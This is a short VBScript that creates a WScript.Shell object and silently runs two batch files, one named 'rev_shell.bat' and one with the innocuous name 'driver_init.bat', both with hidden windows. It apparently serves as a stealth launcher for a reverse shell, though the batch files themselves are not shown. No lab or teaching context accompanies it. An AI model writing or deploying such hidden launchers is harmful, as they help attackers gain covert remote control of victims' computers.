Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & "rev_shell.bat" & Chr(34), 0
Set WshShell = Nothing

Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & "driver_init.bat" & Chr(34), 0
Set WshShell = Nothing